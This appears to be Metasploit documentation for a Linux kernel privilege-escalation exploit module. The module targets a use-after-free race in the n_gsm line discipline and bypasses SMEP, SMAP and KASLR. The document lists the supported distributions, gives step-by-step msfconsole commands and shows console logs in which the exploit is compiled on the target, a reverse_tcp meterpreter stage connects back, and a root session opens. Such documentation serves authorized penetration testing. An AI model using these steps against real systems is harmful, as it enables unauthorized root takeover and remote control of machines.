## Vulnerable Application

This module exploits a race condition leading to a use-after-free on
the kmalloc-1024 slab. The bug exists in the `n_gsm` tty line discipline,
created for gsm modems. The race condition results in a UAF on a struct
`gsm_dlci` while restarting the gsm mux.

The target system must have at least two CPU cores.

Bypasses for SMEP, SMAP and KASLR are included.

This module has been tested successfully on

* Ubuntu 20.04 Server (x86_64)
* Ubuntu 18.04 Server (x86_64)
* CentOS 8 Server (x86_64)
* RHEL 8 Server (x86_64)


## Verification Steps

1. Start `msfconsole`
2. Get a session
3. `use exploit/linux/local/gsm_multiplex_priv_esc`
4. `set SESSION [SESSION]`
5. `check`
6. `run`
7. You should get a new *root* session


## Options

### WritableDir

A writable directory file system path. (default: `/tmp`)

### COMPILE

Options: `Auto` `True` `False` (default: `True`)

Whether the exploit should be live compiled with `gcc` on the target system,
or uploaded as a pre-compiled binary.

`Auto` will first determine if `gcc` is installed to compile live on the system,
and fall back to uploading a pre-compiled binary.

Currently only `True` is supported.

## Scenarios

```
msf6 > use exploit/linux/local/gsm_multiplex_priv_esc
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > check 
[+] System architecture x64 is supported
[+] Ubuntu running Linux 4.15.0-20-generic is vulnerable.
[+] System has 4 CPU cores
[*] The target appears to be vulnerable.
msf6 exploit(linux/local/gsm_multiplex_priv_esc) >
```

```
msf6 > use exploit/linux/local/gsm_multiplex_priv_esc
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[+] System architecture x64 is supported
[+] Ubuntu running Linux 4.15.0-20-generic is vulnerable.
[+] System has 4 CPU cores
[+] The target appears to be vulnerable.
[*] Inlining the payload inside the exploit.
[*] Live compiling exploit on system...
[*] Launching exploit
[*] Sending stage (24772 bytes) to 192.168.138.192
[*] Meterpreter session 2 opened (192.168.138.118:4444 -> 192.168.138.192:45816) at 2024-02-20 23:45:39 +0000
meterpreter > getuid 
Server username: root
meterpreter > :)
```

```
msf6 > use exploit/linux/local/gsm_multiplex_priv_esc
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(linux/local/gsm_multiplex_priv_esc) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[+] System architecture x64 is supported
[+] Ubuntu running Linux 4.15.0-20-generic is vulnerable.
[+] System has 4 CPU cores
[+] The target appears to be vulnerable.
[*] Using a payload binary.
[*] Writing '/tmp/.KQ5ubQ4P3' (1068672 bytes) ...
[*] Live compiling exploit on system...
[*] Launching exploit
[*] Sending stage (24772 bytes) to 192.168.138.192
[*] Meterpreter session 2 opened (192.168.138.118:4444 -> 192.168.138.192:45910) at 2024-02-20 23:47:54 +0000
meterpreter > getuid 
Server username: root
meterpreter > :)
```
